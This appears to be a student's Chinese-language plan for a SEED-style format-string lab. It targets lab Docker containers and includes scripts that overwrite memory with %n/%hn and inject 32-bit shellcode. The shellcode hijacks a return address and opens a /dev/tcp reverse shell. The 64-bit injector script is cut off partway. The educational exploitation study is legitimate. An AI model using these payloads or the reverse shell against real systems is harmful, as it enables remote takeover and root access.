# CSCI 585 – Lab 3 作业完成计划（Format String Attack：Exploitation & Remediation）

> 依据：`Lab3.pdf`（7 页，Due on **Oct 10**）
> 提交物：一份**带截图的详细实验报告**（说明做了什么、观察到什么、解释有趣/意外的现象、列出重要代码片段**并附解释**；只贴代码不解释不得分）
> 前提：**Lab 2 的 SEED VM 环境仍可用**（已确认）——本计划以「复用 + 补充验证」为主；若环境丢失，按 lab2_plan.md 第 1 节从零搭建即可。
> 说明：本计划中所有地址、偏移都给出**计算公式**，具体数值必须以你机器上的**实测为准**（示例值仅供参考）。

---

## 0. 作业概述与硬性约束

| 项目 | 内容 |
| --- | --- |
| 漏洞 | CWE-134：`myprintf(char *msg)` 中的 `printf(msg)`，用户输入被当成格式串 |
| Task 1（改内存） | **10.9.0.5**（32 位）。改写 `target`（初值 `0x11223344`）：3.A 改成任意值；3.B 改成 `0x5000`；3.C 改成 `0xAABBCCDD` |
| Task 2（代码注入） | **10.9.0.5**（32 位）。注入 shellcode + 改写函数返回地址 → 先跑固定命令，再拿**反弹 shell** |
| Task 3（64 位） | **10.9.0.6**（64 位）。克服地址中的 NULL 字节，用 64 位 shellcode 拿 root 反弹 shell（Apple Silicon 学生可跳过；我们是 x86_64 → **要做**） |
| Task 4（修复） | 改源码、看 gcc 警告（`-Wformat-security`）、重编译、验证攻击失效 |
| 输入上限 | **1500 字节**（`format.c` 中 `char buf[1500]`） |
| 结果在哪看 | **攻击结果（打印/写入/命令输出）全部出现在 server 容器的控制台**，`nc` 端看不到 → 截图必须截 `docker logs` / `docker-compose up` 窗口 |
| 成功判据（Task 1） | 容器打印 `The target variable's value (after): <新值>` ≠ `0x11223344` |
| 成功判据（Task 2/3） | 容器控制台出现 shellcode 输出（`ls` 列表 / `Hello` / `passwd` 尾部），或攻击者 `nc -l` 收到回连并能敲命令；正常返回路径的 `(after)` 行**不再出现** |
| 地址规则 | 服务器每次连接都打印 Input buffer / target / Frame Pointer 等地址；**容器不重启就不变**，重启则全变（与 ASLR 无关，是 server 内置随机性）→ 脚本一律把地址当参数传入，重启后只需重跑基线 |
| 每次连接 = 新进程 | `target` 每次连接都会复位成初值，三个子任务可分别独立验证 |

**PDF 阅读备注（重要）**：`Lab3.pdf` 里 Question 1/2 的标记字符因 Word→PDF 字体损坏，渲染成了 `@` 和 `0`（shellcode 清单里的 "Line ⓪/ⓐ/ⓑ" 同样损坏）。实际指代的是 **Figure 1 中的 ①②③ 标记**。本计划给出 ①②③ **三个地址的统一算法**，覆盖任何一种读法，报告里把三个都算出来即可稳妥作答。

**目录/环境约定**（与 Lab 2 相同）：

```
~/Labsetup/
├── docker-compose.yml
├── server-code/      ← Makefile, format.c, server.c
├── fmt-containers/   ← Dockerfile-32 / Dockerfile-64，make install 拷入二进制
└── attack-code/      ← exploit.py（含 32/64 位 shellcode）、build_string.py 等
容器: server-10.9.0.5 (32 位) / server-10.9.0.6 (64 位)，攻击者 = VM 自身 10.9.0.1
```

---

## 1. 环境设置（复用 Lab 2，约 30 分钟，📸 L3-01 ~ L3-04）

### 1.1 前置检查与 ASLR

```bash
docker --version; python3 --version; nc -h | head -1
sudo sysctl -w kernel.randomize_va_space=0
cat /proc/sys/kernel/randomize_va_space        # 预期输出 0
```

### 1.2 确认容器在跑

```bash
cd ~/Labsetup
docker-compose ps                              # 未启动则: docker-compose up -d (别名 dcup)
docker ps --format "{{.ID}} {{.Names}}"        # 别名: dockps
# 预期:
# xxxxxxxx server-10.9.0.5
# xxxxxxxx server-10.9.0.6
```

开一个专门看日志的终端（截图主要截这个窗口，干净无前缀）：

```bash
docker logs -f server-10.9.0.5
```

**📸 L3-01**：`dockps` 两个容器 + `randomize_va_space` = 0。

### 1.3 查看官方 shellcode

```bash
ls ~/Labsetup/attack-code/
grep -n "shellcode\|def \|__main__" ~/Labsetup/attack-code/exploit.py | head -30
```

搞清楚 exploit.py 里 32 位 / 64 位 shellcode 的**变量名与结构**（Task 2、Task 3 都要用；32 位的也可以直接用本计划从 PDF 抄录的版本）。

**📸 L3-02**：`exploit.py` 中 shellcode 部分的 `cat`/`grep` 输出。

### 1.4 32 位基线（记录地址）

```bash
echo hello | nc -w 3 10.9.0.5 9090        # 不退出按 Ctrl+C
```

容器控制台**预期**（地址与你不同，全部记下来）：

```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | Input buffer (address):        0xffffd2d0      ← 记: BUF
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068      ← 记: TARGET
server-10.9.0.5 | Input size: 6
server-10.9.0.5 | Frame Pointer inside myprintf() = 0xffffd1f8   ← 记: FP
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hello
server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)
server-10.9.0.5 | The target variable's value (after): 0x11223344
```

**📸 L3-03**：完整基线（含三个地址 + 笑脸）。

### 1.5 64 位基线（记录地址，Task 3 用）

```bash
echo hello | nc -w 3 10.9.0.6 9090
```

**预期**（PDF 第 4 页样例，地址以实际为准）：

```
server-10.9.0.6 | Input buffer (address):        0x00007fffffffe200   ← 记: BUF64
server-10.9.0.6 | The secret message's address: 0x0000555555556008
server-10.9.0.6 | The target variable's address: 0x0000555555558010
server-10.9.0.6 | Frame Pointer (inside myprintf):      0x00007fffffffe140  ← 记: FP64
server-10.9.0.6 | The target variable's value (before): 0x1122334455667788
server-10.9.0.6 | hello
server-10.9.0.6 | (ˆ_ˆ)(ˆ_ˆ) Returned from printf() (ˆ_ˆ)(ˆ_ˆ)
server-10.9.0.6 | The target variable's value (after): 0x1122334455667788
```

### 1.6 重测 32 位偏移 N（参数序号标定）

把脚本放在 `~/Labsetup/attack-code/` 下执行。

```python
#!/usr/bin/env python3
# probe32.py — buf[0:4] 所在的参数序号 N 标定探针 (32 位)
import struct
MARKER, K = 0xdeadbeef, 250           # 4 + 5*250 = 1254 <= 1500
payload = struct.pack('<I', MARKER) + (b'%.8x.' * K)
assert len(payload) <= 1500
open('probe32.bin', 'wb').write(payload)
print('payload size:', len(payload))
```

```python
#!/usr/bin/env python3
# findN.py — 从容器最近一次日志里自动数出 N
# 用法: python3 findN.py [容器名] [标记子串]   默认: server-10.9.0.5 deadbeef
import subprocess, sys
container = sys.argv[1] if len(sys.argv) > 1 else 'server-10.9.0.5'
marker    = sys.argv[2] if len(sys.argv) > 2 else 'deadbeef'
r = subprocess.run(['docker', 'logs', container], capture_output=True, text=True, errors='replace')
out = r.stdout + r.stderr
last = out.split('Got a connection')[-1]           # 只看最近一次连接
n = None
for line in last.splitlines():
    if marker in line:
        n = line.split(marker)[0].count('.') + 1   # 标记前每组 "%.8x." 有一个 '.'
        break
print('N =', n if n is not None else '未找到标记: 检查 payload 是否发送成功 / 增大 K')
```

```bash
cd ~/Labsetup/attack-code
python3 probe32.py
cat probe32.bin | nc -w 3 10.9.0.5 9090        # Ctrl+C 也行
python3 findN.py                                # → N = xx
```

**预期**：控制台一大串 8 位 hex 中出现 **`deadbeef`**；`findN.py` 打印 `N = xx`（量级参考 20~80，**必须实测**，Labsetup 的 `L`/`BUF_SIZE` 不同 N 就不同）。

**📸 L3-04**：probe 发送命令 + 控制台 `deadbeef` 片段 + `N = xx`。

> 64 位的 N8 探针推迟到 Task 3 前再测（见 4.2），复用 `findN.py`。

---

## 2. Task 1：修改服务器内存（10.9.0.5，📸 L3-05 ~ L3-07）

### 2.0 核心技巧（三个子任务通用）

1. **地址放 payload 末尾，格式串在前**：
   - `printf` 从 `buf[0]` 开始解析，格式串（纯 `%…` 说明符）先执行完，**写入动作全部完成**后才解析到末尾的地址字节；
   - 地址里的 `0x00` 只会截断"地址本身"（无所谓，参数读取走的是**栈内存**，与字符串截断无关）；`0x25('%')` 若出现在地址中才有风险（坏字节检查见脚本）。
2. **直接寻址 `%k$n`**：参数序号 `k = N + (地址在 buf 中的偏移) / 4`，与地址在串中的位置解耦。
3. **计数规则**：`%n` 写入的值 = 此刻 printf 已输出的字符总数；`%1$Wc` 可精确补 W 个字符。
4. **写入方式选择**：
   - 目标值 ≤ 5,000,000 → 一次 `%n` 写满 4 字节（3.A、3.B 用这个）；
   - 目标值很大（3.C 的 `0xAABBCCDD` ≈ 28.6 亿字符，直接 `%n` 要打印数小时）→ 拆两个 **`%hn` 半字写**，每个 count ≤ 65535，总共打印约 5 万字符，秒级完成。

### 2.1 通用脚本 `task1_write.py`

```python
#!/usr/bin/env python3
"""
task1_write.py — Task 1 通用写内存脚本 (32 位, 目标 10.9.0.5)

用法:
  python3 task1_write.py <target地址> <N> <目标值> [输出文件]
  python3 task1_write.py 0x080e5068 61 0x4d2      task1_3a.bin   # 3.A 任意值
  python3 task1_write.py 0x080e5068 61 0x5000     task1_3b.bin   # 3.B 0x5000
  python3 task1_write.py 0x080e5068 61 0xaabbccdd task1_3c.bin   # 3.C 0xAABBCCDD

布局: [格式串][4字节对齐填充][地址...]     <- 地址放最后, 规避 0x00 截断
序号: 参数序号 = N + 地址偏移/4            <- N 来自 deadbeef 探针
"""
import struct, sys, itertools

THRESHOLD = 5_000_000          # 超过此值改用两次 %hn

def p32(x):
    return struct.pack('<I', x & 0xffffffff)

def check_addrs(addrs):
    for a in addrs:
        z = a.find(b'\x00')
        region = a[:z] if z >= 0 else a
        if b'%' in region:
            print(f'坏字节: 地址 {a.hex()} 在首个\\x00前含 0x25(%)')
            print('处理: docker-compose down && docker-compose up 换地址后重跑基线')
            sys.exit(1)

def build(fmt_fn, addrs, N, align=4):
    """地址放末尾并按 align 对齐, 迭代到参数序号稳定"""
    idxs = [0] * len(addrs)
    fmt = pad = b''
    for _ in range(10):
        fmt = fmt_fn(idxs)
        off = len(fmt)
        pad = b'A' * ((align - off % align) % align)
        new = [N + (off + len(pad)) // align + i for i in range(len(addrs))]
        if new == idxs:
            break
        idxs = new
    return fmt + pad + b''.join(addrs), idxs

def plan_words(items, init=0):
    """items: [(偏移, 16位值)] -> 枚举写入顺序, 返回 [(偏移, 此时计数)] 且最终计数最小"""
    best = None
    for order in itertools.permutations(items):
        cur, ws = init, []
        for off, val in order:
            cur += (val - cur) % 65536
            ws.append((off, cur))
        if best is None or ws[-1][1] < best[-1][1]:
            best = ws
    return best

def main():
    if len(sys.argv) < 4:
        print(__doc__); sys.exit(1)
    target = int(sys.argv[1], 16)
    N      = int(sys.argv[2])
    goal   = int(sys.argv[3], 16)
    out    = sys.argv[4] if len(sys.argv) > 4 else 'task1_payload.bin'

    if goal == 0:
        fmt_fn = lambda idxs: f"%{idxs[0]}$n".encode()
        addrs  = [p32(target)]
        mode   = '%n @count=0'
    elif goal < THRESHOLD:
        fmt_fn = lambda idxs: f"%1${goal}c%{idxs[0]}$n".encode()
        addrs  = [p32(target)]
        mode   = f'%n 一次写 4 字节 (count={goal})'
    else:
        items  = [(0, goal & 0xffff), (2, (goal >> 16) & 0xffff)]
        writes = plan_words(items, init=0)
        offs   = [0, 2]
        def fmt_fn(idxs, writes=writes, offs=offs):
            parts, prev = [], 0
            for off, cur in writes:
                if cur > prev:
                    parts.append(f"%1${cur - prev}c".encode())
                parts.append(f"%{idxs[offs.index(off)]}$hn".encode())
                prev = cur
            return b''.join(parts)
        addrs = [p32(target), p32(target + 2)]
        mode  = '%hn 两次半字写: ' + ' '.join(
                    f'@target{off:+d}={dict(items)[off]:#06x}(count={cur})' for off, cur in writes)

    check_addrs(addrs)
    payload, idxs = build(fmt_fn, addrs, N)
    assert len(payload) <= 1500, f'payload {len(payload)} > 1500'
    open(out, 'wb').write(payload)
    print('模式:', mode)
    print('地址参数序号:', idxs)
    print(f'payload: {len(payload)}B -> {out}')
    print(f'发送: cat {out} | nc -w 3 10.9.0.5 9090')
    print(f'验证: docker logs server-10.9.0.5 2>&1 | grep "value (after)"  -> 预期 {goal:#010x}')

main()
```

### 2.2 Task 3.A：改成任意值（📸 L3-05）

```bash
cd ~/Labsetup/attack-code
python3 task1_write.py <TARGET基线地址> <N> 0x4d2 task1_3a.bin
cat task1_3a.bin | nc -w 3 10.9.0.5 9090
```

**应该得到的结果**（容器控制台）：

```
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | <格式串输出 1234 个字符>
server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)
server-10.9.0.5 | The target variable's value (after): 0x000004d2   <- 改写成功
```

原理：`%1$1234c` 打印 1234 字符 → `%k$n` 把 1234（=0x4d2）以 4 字节整数写入 `*地址`（地址在 payload 末尾、序号 k=N+偏移/4）。只要 `(after)` ≠ `0x11223344` 即成功；换成别的值（如 `0x12345678` < 5M）同样可行。

**📸 L3-05**：脚本命令行 + 发送命令 + 控制台 `(before)→(after)` 对比片段。

### 2.3 Task 3.B：改成 0x5000（📸 L3-06）

```bash
python3 task1_write.py <TARGET> <N> 0x5000 task1_3b.bin
cat task1_3b.bin | nc -w 3 10.9.0.5 9090
```

**应该得到的结果**：

```
server-10.9.0.5 | The target variable's value (after): 0x00005000   <- 精确命中
```

原理：0x5000 = 20480 < 5M → `%1$20480c` + `%k$n`，一次 `%n` 写满 4 字节，`count=20480` → `0x00005000`。打印 2 万字符瞬间完成。

**📸 L3-06**：命令 + `(after): 0x00005000`。

### 2.4 Task 3.C：改成 0xAABBCCDD（📸 L3-07）

```bash
python3 task1_write.py <TARGET> <N> 0xaabbccdd task1_3c.bin
cat task1_3c.bin | nc -w 3 10.9.0.5 9090
```

**应该得到的结果**：

```
server-10.9.0.5 | <约 5 万字符的输出>
server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)
server-10.9.0.5 | The target variable's value (after): 0xaabbccdd   <- 成功
```

原理（脚本自动完成，报告里要能讲清楚）：

- `0xAABBCCDD` = 2,864,030,141 → 直接 `%n` 要打印 28.6 亿字符 ≈ 数小时，**不可行**；
- 拆两个半字：`target+2` 写 `0xAABB`(43707)，`target+0` 写 `0xCCDD`(52445)；
- 脚本枚举两种顺序选总打印量小的：**先** `%1$43707c` + `%k2$hn`（写 0xAABB），**再** `%1$8738c` + `%k0$hn`（累计 52445 → 写 0xCCDD），共打印 52445 字符；
- 两个地址分别放 payload 末尾的第 0、4 字节处（4 字节对齐），序号 = `N + 偏移/4`。

**📸 L3-07**：命令 + `(after): 0xaabbccdd`（可附脚本打印的"写入计划"行）。

### 2.5 Task 1 报告要点

- 三个子任务分别对应 `%n`（4 字节一次写）、`%n`（精确 count）、**`%hn` 分半字写**（大值）；解释为何大值必须用 `%hn`/`%hhn`（计数 = 打印字符数，2^32 不可行，2^16 可行）。
- 解释"地址放末尾 + `%k$` 直接寻址"两个技巧各自解决什么问题。
- 指出这破坏的是 CIA 中的**完整性（integrity）**：攻击者改写程序内部状态即可改变程序行为。
- 每次连接是新进程 → `(before)` 恒为 `0x11223344`，便于反复验证。

---

## 3. Task 2：注入恶意代码 + 反弹 shell（10.9.0.5，📸 L3-08 ~ L3-10）

### 3.1 回答 Question 1 / Question 2（先算地址，📸 L3-08）

**Figure 1 标记含义**（自上而下，高地址 → 低地址）：

| 标记 | 位置 | 含义 | 地址算法（32 位） |
| --- | --- | --- | --- |
| ① | printf 帧的 `format string` 行 | printf 第 0 个参数（msg 指针）所在的栈槽 | `① = BUF − 4 × N` |
| ② | myprintf 帧的 `Return Address` | myprintf 的返回地址槽（**Task 2 要改写的就是它**） | `② = FP + 4` |
| ③ | main 帧 buf[1500] 下沿的 `...` | 用户输入缓冲区起点（shellcode 就放这里） | `③ = BUF`（Input buffer 地址） |

- 参数指针从 **① 之上的第一个可选参数（= ①+4 = arg#1）** 开始，每 `%x` 前进 4 字节；arg#k 的地址 = `① + 4k`；arg#N = BUF → `① = BUF − 4N`。
- **Question 2 公式**：把指针从 ①+4 走到目标 T 需要的 `%x` 个数 = `(T − ①) / 4`。
  - 走到 ②：`(FP + 4 − BUF)/4 + N`
  - 走到 ③：`N`（恰等于 Lab2 探针值）

```python
#!/usr/bin/env python3
# calc_q12.py — 计算 Figure 1 三个标记地址与 %x 计数
# 用法: python3 calc_q12.py <BUF hex> <FP hex> <N>
import sys
buf, fp, N = int(sys.argv[1], 16), int(sys.argv[2], 16), int(sys.argv[3])
m1, m2, m3 = buf - 4 * N, fp + 4, buf
assert (m3 - m1) % 4 == 0
print(f'① format-string 参数槽 = BUF-4N = {m1:#010x}')
print(f'② myprintf 返回地址槽   = FP+4    = {m2:#010x}')
print(f'③ 输入缓冲区起点        = BUF     = {m3:#010x}')
print(f'从 arg#1(=①+4) 走到 ② 需要 %x 个数 = {(m2 - m1) // 4}')
print(f'从 arg#1(=①+4) 走到 ③ 需要 %x 个数 = {(m3 - m1) // 4}  (= N)')
```

```bash
python3 calc_q12.py <BUF> <FP> <N>
```

**报告作答建议**：把三个地址与两个计数**都**写上（各配一行推导），再按你对题面标记的判断选取——因为 PDF 字形损坏，这是最稳妥的做法。附 `calc_q12.py` 输出截图。

**📸 L3-08**：`calc_q12.py` 输出（含 ①②③ 地址与计数）。

### 3.2 Shellcode 分析（报告要能复述）

32 位 shellcode 共 **137 字节**，构成（来自 Lab3.pdf，已验证无 `0x00`、无 `0x25`）：

```
[48 字节机器码]                <- execve("/bin/bash", argv, NULL) 的指令
"/bin/bash*"   10B             <- argv[0]，'*' 运行时被改成 0x00
"-c*"           3B             <- argv[1]
"<命令串>"      60B             <- argv[2]：59 字符 + '*'（下标 59 固定）
"AAAA""BBBB""CCCC""DDDD" 16B   <- argv[0..3] 指针占位，运行时回填
```

- **命令串总长必须保持 60 字节、`*` 固定在下标 59**：argv 指针在机器码里是硬编码偏移，改长度就得改机器码。换命令只能**等长替换**（不足用空格补到 59，再接 `*`）。
- 默认命令：`/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd`（50 字符 + 9 空格 + `*`）。
- 反弹 shell 命令：`/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1`（47 字符 + 12 空格 + `*`）。

### 3.3 注入脚本 `task2_inject.py`

```python
#!/usr/bin/env python3
"""
task2_inject.py — Task 2: 注入 32 位 shellcode + 劫持 myprintf 返回地址 (10.9.0.5)

用法:
  python3 task2_inject.py <BUF地址> <FP> <N>                  # 跑默认固定命令
  python3 task2_inject.py <BUF地址> <FP> <N> --rshell 10.9.0.1 # 反弹 shell

布局: [shellcode 137B][pad4][格式串][pad4][p32(②)][p32(②+2)]
  - shellcode 放 buf 开头 -> 执行地址 = 服务器打印的 Input buffer 地址
  - ②(返回地址槽) = FP + 4；两次 %hn 把它改成 buf（栈地址 0xffffxxxx 拆两个半字）
"""
import struct, sys

BIN = bytes.fromhex(
    'eb295b31c088430988430c884347895b'
    '488d4b0a894b4c8d4b0d894b50894354'
    '8d4b4831d231c0b00bcd80e8d2ffffff')          # 48B
CMD_FIXED = "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd"
CMD_RSC    = "/bin/bash -i > /dev/tcp/{ip}/9090 0<&1 2>&1"

def make_sc(cmd):
    assert len(cmd) <= 59, '命令串过长'
    field = (cmd + ' ' * (59 - len(cmd))) + '*'          # 固定 60B, '*' 在下标 59
    sc = BIN + b'/bin/bash*' + b'-c*' + field.encode() + b'AAAA' + b'BBBB' + b'CCCC' + b'DDDD'
    assert len(sc) == 137
    assert b'\x00' not in sc and b'%' not in sc, 'shellcode 含 0x00/% -> 见排错表(改布局B)'
    return sc

def plan2(v0, v1, init):
    """两个半字写, 枚举顺序取最终计数最小"""
    best = None
    for order in [(0, 1), (1, 0)]:
        cur, ws = init, []
        for w in order:
            cur += ((v0 if w == 0 else v1) - cur) % 65536
            ws.append((w, cur))
        if best is None or ws[-1][1] < best[-1][1]:
            best = ws
    return best

def main():
    if len(sys.argv) < 4:
        print(__doc__); sys.exit(1)
    buf = int(sys.argv[1], 16)
    fp  = int(sys.argv[2], 16)
    N   = int(sys.argv[3])
    ip  = sys.argv[sys.argv.index('--rshell') + 1] if '--rshell' in sys.argv else None

    sc   = make_sc(CMD_RSC.format(ip=ip) if ip else CMD_FIXED)
    slot = fp + 4                                    # ② myprintf 返回地址槽
    pad1 = b'A' * ((4 - len(sc) % 4) % 4)            # 137 -> 140
    init = len(sc) + len(pad1)                       # 格式串开始前已打印的字符数
    writes = plan2(buf & 0xffff, (buf >> 16) & 0xffff, init)
    addrs = [struct.pack('<I', slot), struct.pack('<I', slot + 2)]

    idxs = [0, 0]
    for _ in range(10):                              # 迭代到序号稳定
        parts, prev = [], init
        for w, cur in writes:
            if cur > prev:
                parts.append(f"%1${cur - prev}c".encode())
            parts.append(f"%{idxs[w]}$hn".encode())
            prev = cur
        fmt  = b''.join(parts)
        off  = len(sc) + len(pad1) + len(fmt)
        pad2 = b'A' * ((4 - off % 4) % 4)
        base = N + (off + len(pad2)) // 4
        new  = [base, base + 1]
        if new == idxs:
            break
        idxs = new

    payload = sc + pad1 + fmt + pad2 + b''.join(addrs)
    assert len(payload) <= 1500
    open('task2_payload.bin', 'wb').write(payload)
    print(f'shellcode: {len(sc)}B @ buf = {buf:#010x}')
    print(f'返回地址槽 ② = FP+4 = {slot:#010x} -> 改写为 {buf:#010x}')
    print('写入计划: ' + ', '.join(
        f'{"low" if w == 0 else "high"}半字@{slot + 2*w:#x} count={c}' for w, c in writes))
    print(f'参数序号: ②={idxs[0]}, ②+4={idxs[1]}, payload={len(payload)}B')
    if ip:
        print('反弹 shell: 先在攻击者(10.9.0.1)开监听: nc -nv -l 9090')
    print('发送: cat task2_payload.bin | nc -w 3 10.9.0.5 9090')

main()
```

### 3.4 第一步：跑默认固定命令（📸 L3-09）

```bash
cd ~/Labsetup/attack-code
python3 task2_inject.py <BUF> <FP> <N>
cat task2_payload.bin | nc -w 3 10.9.0.5 9090
```

**应该得到的结果**（容器控制台，在 "Returned …" 笑脸之后）：

```
server-10.9.0.5 | total …（ls -l 的目录列表）
server-10.9.0.5 | Hello
server-10.9.0.5 | root:x:0:0:root:/root:/bin/bash        <- /etc/passwd 最后 2 行
server-10.9.0.5 | daemon:…                                （以实际输出为准）
```

判定成功：

1. 出现 **`ls -l` 列表 + `Hello` + `/etc/passwd` 尾行** —— shellcode 在服务器上执行了；
2. `(after)` 行**缺失**（myprintf 被劫持、没返回 main）—— 说明返回地址确实被改写；
3. 笑脸 "Returned …" 仍会出现（它在 printf 返回后、myprintf 自己 `ret` 之前打印），属正常。

**📸 L3-09**：payload 生成命令 + 控制台中 shellcode 输出的完整片段（与基线 L3-03 对比，突出 `(after)` 消失）。

### 3.5 第二步：反弹 shell（📸 L3-10）

**终端 A（攻击者 = VM 10.9.0.1）先开监听**：

```bash
nc -nv -l 9090
# 预期: Listening on 0.0.0.0 9090
```

**终端 B 发攻击**：

```bash
python3 task2_inject.py <BUF> <FP> <N> --rshell 10.9.0.1
cat task2_payload.bin | nc -w 3 10.9.0.5 9090
```

**应该得到的结果**（终端 A）：

```
Connection received on 10.9.0.1 …
id                      <- 直接敲命令
uid=0(root) gid=0(root) …
hostname
server-10.9.0.5
ifconfig / ip addr      <- 确认是容器的 10.9.0.5 网络
```

判定成功：`nc -l` 窗口出现回连提示 + `id` 返回 **uid=0(root)** + `hostname` 为 `server-10.9.0.5`。

**📸 L3-10**：两个窗口——`nc -nv -l 9090` 监听+回连+`id`/`hostname` 输出；`task2_inject.py --rshell` 命令行。

### 3.6 Figure 1 标注 + Task 2 报告要点

- **Figure 1 上标出 shellcode 位置**：写明"恶意代码 137 字节存放在 ③ 处，即 `Input buffer (address) = 0x……`（你的实测值），覆盖 buf[0..136]"。
- 逐段解释格式串构造：初始计数 = 140（shellcode+对齐，全是字面量）→ `%1$Xc` 补到目标 count → `%k$hn` 写 low/high 半字，序号怎么算（`N + 偏移/4`），两次写入各改什么。
- 解释为什么改的是 ②（`FP+4`）而不是 printf 的返回地址。
- **反弹 shell 原理**（对应 PDF Section 5）：`nc -l 9090` 变成 TCP 服务器；`/bin/bash -i > /dev/tcp/IP/9090 0<&1 2>&1` 把 shell 的 stdin/stdout/stderr 全部接到这条 TCP 连接上 → 远端可交互。说明你把命令串等长替换、`*` 位置不变的处理。
- 破坏的 CIA 维度：完整性 + 最终的**机密性/权限**（root 远程 shell）。

---

## 4. Task 3：攻击 64 位服务器（10.9.0.6，📸 L3-11 ~ L3-13）

### 4.1 与 32 位的差异 & NULL 字节问题（报告必答）

| 维度 | 32 位 (10.9.0.5) | 64 位 (10.9.0.6) |
| --- | --- | --- |
| 地址宽度 | 4 字节，通常无 0x00 | **8 字节，高 2 字节必为 0x00**（`0x00007fff…`/`0x00005555…`） |
| 参数步长 | 4 字节/参数 | 8 字节/参数；且 arg1–5 在**寄存器**里（RSI/RDX/RCX/R8/R9），栈从 arg6 起 → 全靠探针标定 N8 |
| 返回地址槽 | ② = FP + 4 | FP + **8** |
| target 初值 | 0x11223344 | 0x1122334455667788 |
| 写返回地址 | 2 个 `%hn`（栈地址 `0xffffxxxx`） | **3 个 `%hn`**（写 w0/w1/w2；w3 双方都是 0x0000，跳过） |
| shellcode | 32 位版（PDF 给出） | 64 位版（`exploit.py` 提供） |

**NULL 字节的解法（报告要展开写）**：

1. 程序**没有 strcpy 之类的内存拷贝**，输入本身可以含 0x00（fread 原样读入）——问题只在 **printf 解析格式串遇到 0x00 会停止**；
2. 因此**把所有 8 字节地址放在 payload 的最末尾**：格式串说明符全部先执行完（`%hn` 写入已全部完成），printf 才解析到地址里的 0x00 并停下——正好无所谓；
3. 参数读取读的是**栈内存**，与格式串字符串是否被截断无关，`%k$hn` 照样能取到放在末尾的地址；
4. 配合 `%k$.Nx` / `%k$n` **直接寻址自由前后移动参数指针**（PDF 第 5 页 `%3$.20x%6$n%2$.10x` 示例），让格式串构造大幅简化；
5. 备选：**布局 B**（格式串+地址在前，shellcode 放最后、根本不需要被 printf 解析），脚本已自动处理。

### 4.2 64 位偏移 N8 标定

```python
#!/usr/bin/env python3
# probe64.py — 64 位 N8 标定探针 (8字节标记 + 每组 16 位 hex)
import struct
MARKER, K = 0xdeadbeefcafebabe, 200        # 8 + 7*200 = 1408 <= 1500
payload = struct.pack('<Q', MARKER) + (b'%.16x.' * K)
assert len(payload) <= 1500
open('probe64.bin', 'wb').write(payload)
print('payload size:', len(payload))
```

```bash
python3 probe64.py
cat probe64.bin | nc -w 3 10.9.0.6 9090
python3 findN.py server-10.9.0.6 deadbeefcafebabe     # -> N8 = xx
```

**预期**：64 位日志里出现 `deadbeefcafebabe`，`findN.py` 打印 `N8 = xx`（与 32 位的 N 不同，**以实测为准**）。

**📸 L3-11**：64 位基线完整输出（三个地址 + target 8 字节初值）+ N8 探针结果。

### 4.3 提取 64 位 shellcode → `sc64.bin`

```bash
cd ~/Labsetup/attack-code
grep -n "shellcode" exploit.py          # 先看 32/64 位变量名与结构
```

稳妥做法（不依赖 exploit.py 的运行逻辑）：新建 `gen_sc64.py`，把 exploit.py 中 **64 位** shellcode 字符串原样粘进去：

```python
#!/usr/bin/env python3
# gen_sc64.py — 从 exploit.py 复制 64 位 shellcode 并导出为文件
shellcode64 = (
    # <- 把 exploit.py 里 64 位 shellcode 的字符串逐行粘贴到这里
).encode('latin-1')
open('sc64.bin', 'wb').write(shellcode64)
print('sc64.bin:', len(shellcode64), 'bytes, 含0x00:', b'\x00' in shellcode64, '含%:', b'%' in shellcode64)
```

```bash
python3 gen_sc64.py        # 记下长度; 含 0x00/% 也没关系(脚本自动改用布局B)
```

### 4.4 64 位注入脚本 `task3_inject.py`

```python
#!/usr/bin/env python3
"""
task3_inject.py — Task 3: 64 位 (10.9.0.6) 代码注入 + 反弹 shell

用法:
  python3 task3_inject.py <BUF64> <FP64> <N8> sc64.bin
  python3 task3_inject.py <BUF64> <FP64> <N8> sc64.bin --rshell 10.9.0.1

关键: 8 字节地址含 0x00 -> 地址放 payload 末尾(布局A);
      shellcode 本身含 0x00/% 时自动改布局B(格式串+地址在前, shellcode 放最后,
      后者不需要被 printf 解析).
返回地址槽 = FP+8; 写 w0/w1/w2 三个半字 (w3 双方均为 0x0000, 跳过).
"""
import struct, sys, itertools

CMD_FIXED = "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd"
CMD_RSC    = "/bin/bash -i > /dev/tcp/{ip}/9090 0<&1 2>&1"

def plan_words(vals, init):
    best = None
    for order in itertools.permutations(range(len(vals))):
        cur, ws = init, []
        for w in order:
            cur += (vals[w] - cur) % 65536
            ws.append((w, cur))
        if best is None or ws[-1][1] < best[-1][1]:
            best = ws
    return best

def check_addrs(addrs):
    for a in addrs:
        z = a.find(b'\x00')
        region = a[:z] if z >= 0 else a
        if b'%' in region:
            print(f'坏字节: {a.hex()} 首个\\x00前含 % -> dcdown && dcup 换 FP 后重测')
            sys.exit(1)

def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    buf = int(sys.argv[1], 16)
    fp  = int(sys.argv[2], 16)
    N8  = int(sys.argv[3])
    sc  = open(sys.argv[4], 'rb').read()
    if '--rshell' in sys.argv:
        ip   = sys.argv[sys.argv.index('--rshell') + 1]
        old  = CMD_FIXED.encode()
        assert old in sc, 'shellcode 中未找到默认命令串 -> 对照 exploit.py 手工改'
        new  = CMD_RSC.format(ip=ip).encode()
        new  = (new + b' ' * len(old))[:len(old)]     # 等长替换, '*' 位置不变
        sc   = sc.replace(old, new)

    slot = fp + 8
    vals = [buf & 0xffff, (buf >> 16) & 0xffff, (buf >> 32) & 0xffff]   # w3 跳过
    clean = (b'\x00' not in sc) and (b'%' not in sc)
    if clean:                                          # 布局A: shellcode 在开头
        pad1 = b'\x90' * ((8 - len(sc) % 8) % 8)
